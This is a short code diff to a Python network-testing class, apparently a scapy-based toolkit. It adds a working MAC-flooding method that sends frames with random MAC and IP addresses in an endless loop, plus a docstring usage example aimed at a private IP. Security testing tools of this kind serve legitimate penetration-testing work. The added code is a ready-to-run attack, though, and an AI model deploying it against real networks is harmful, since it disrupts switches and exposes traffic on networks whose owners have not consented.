@@ -120,10 +120,14 @@ class NetworkCheck:
     # simulating MAC flood attacks
     def MAC_flood(self, interface, target_ip):
         """
-        # TODO
+        # Method for MAC flooding
+        Example usage: nttl.mac_flood(interface='wlan0', target_ip='192.168.1.154')
         """
         self.interface = interface
         self.target_ip = target_ip
+        
+        flood_packet = Ether(src=RandMAC("*:*:*:*:*:*"), dst=RandMAC("*:*:*:*:*:*"))/IP(src=RandIP("*.*.*.*"), dst=self.target_ip)/ICMP()
+        sendp(flood_packet, iface=self.interface, loop=1)
 
     # sniffer detection
     def bad_nose(self, subunet):
